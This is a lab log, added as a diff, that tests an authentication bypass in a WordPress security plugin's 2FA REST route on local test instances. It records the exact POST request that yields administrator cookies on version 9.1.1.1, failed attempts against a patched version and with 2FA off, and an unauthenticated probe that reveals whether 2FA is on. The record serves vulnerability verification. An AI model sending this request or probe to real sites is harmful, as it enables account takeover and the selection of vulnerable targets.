@@ -1,0 +1,100 @@
+==================================================================
+## STATE A1 / 9.1.1.1 / 2FA ON   (http://127.0.0.1:8081)
+==================================================================
+-- ground truth --
+   plugin version : 9.1.1.1
+   login_protection_enabled = 1
+   user_id 1 login  = admin
+-- request --
+   POST /?rest_route=/reallysimplessl/v1/two_fa/skip_onboarding
+   body: user_id=1&login_nonce=RQ-C1-NOT-A-VALID-NONCE&redirect_to=/wp-admin/
+-- response --
+   status: HTTP/1.1 200 OK
+   Set-Cookie names:    wordpress_868d72495b7d63175cfbaed4ef4dd9ea=<value>    wordpress_868d72495b7d63175cfbaed4ef4dd9ea=<value>|   wordpress_logged_in_868d72495b7d63175cfbaed4ef4dd9ea=<value>
+   Set-Cookie wordpress_logged_in decoded prefix: wordpress_logged_in_868d72495b7d63175cfbaed4ef4dd9ea=admin%7C1792543977%7CcnfSngC6CQyyNuakqYQK8mYkBQNbTvTjl04hvcCGQLP%7C929ed601e8d209a3e7ecbde5d9f0dccecb5436d805266680887426d238b60948
+   body: {"redirect_to":"\/wp-admin\/"}
+-- decisive check: authenticated admin? --
+   GET /wp-admin/users.php -> 200
+   wp-settings cookie for user 1: 0
+   wp-admin-bar present: 1
+   login form present  : 0
+   RESULT: BYPASS SUCCEEDED (authenticated as uid 1)
+
+==================================================================
+## STATE A2 / 9.1.1.1 / 2FA OFF  (http://127.0.0.1:8081)
+==================================================================
+-- ground truth --
+   plugin version : 9.1.1.1
+   login_protection_enabled = 0
+   user_id 1 login  = admin
+-- request --
+   POST /?rest_route=/reallysimplessl/v1/two_fa/skip_onboarding
+   body: user_id=1&login_nonce=RQ-C1-NOT-A-VALID-NONCE&redirect_to=/wp-admin/
+-- response --
+   status: HTTP/1.1 404 Not Found
+   Set-Cookie names: 
+   Set-Cookie wordpress_logged_in decoded prefix: 
+   body: {"code":"rest_no_route","message":"No route was found matching the URL and request method.","data":{"status":404}}
+-- decisive check: authenticated admin? --
+   GET /wp-admin/users.php -> 302
+   wp-settings cookie for user 1: 0
+   wp-admin-bar present: 0
+   login form present  : 0
+   RESULT: NO BYPASS
+
+==================================================================
+## STATE A3 / 9.1.2 / 2FA ON     (http://127.0.0.1:8082)
+==================================================================
+-- ground truth --
+   plugin version : 9.1.2
+   login_protection_enabled = 1
+   user_id 1 login  = admin
+-- request --
+   POST /?rest_route=/reallysimplessl/v1/two_fa/skip_onboarding
+   body: user_id=1&login_nonce=RQ-C1-NOT-A-VALID-NONCE&redirect_to=/wp-admin/
+-- response --
+   status: HTTP/1.1 500 Internal Server Error
+   Set-Cookie names: 
+   Set-Cookie wordpress_logged_in decoded prefix: 
+   body: <!DOCTYPE html>
+<html lang="en-US">
+<head>
+	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+		<meta name='
+-- decisive check: authenticated admin? --
+   GET /wp-admin/users.php -> 302
+   wp-settings cookie for user 1: 0
+   wp-admin-bar present: 0
+   login form present  : 0
+   RESULT: NO BYPASS
+
+== restore final state: both instances 2FA ON ==
+done.
+
+==================================================================
+## EXTRA — unauthenticated observability of the 2FA precondition
+==================================================================
+Question (pilot R1): is '2FA on' observable over HTTP without auth?
+Probe used (no exploit, no nonce): POST the route with a missing param.
+
+=== Ca A — unauthenticated observability of the 2FA precondition (HTTP only) ===
+--- 2FA = 1 (ground truth) ---
+OPTIONS /?rest_route=/reallysimplessl/v1/two_fa/skip_onboarding
+    HTTP/1.1 200 OK
+    Allow: POST
+POST (missing required params, no exploit) /?rest_route=/reallysimplessl/v1/two_fa/skip_onboarding
+    status=400
+    body={"code":"rest_missing_callback_param","message":"Missing parameter(s): user_id, login_nonce","data":{"status":400,"param
+--- 2FA = 0 (ground truth) ---
+OPTIONS /?rest_route=/reallysimplessl/v1/two_fa/skip_onboarding
+    HTTP/1.1 200 OK
+POST (missing required params, no exploit) /?rest_route=/reallysimplessl/v1/two_fa/skip_onboarding
+    status=404
+    body={"code":"rest_no_route","message":"No route was found matching the URL and request method.","data":{"status":404}}
+(restored 2FA ON)
+
+Interpretation: the two_fa REST route is registered only when 2FA is on, so
+unauthenticated route presence (Allow: POST / rest_missing_callback_param vs
+rest_no_route) is an indirect HTTP signal of the 2FA precondition. It is a
+proxy for the feature state, not a direct '2FA on' banner.
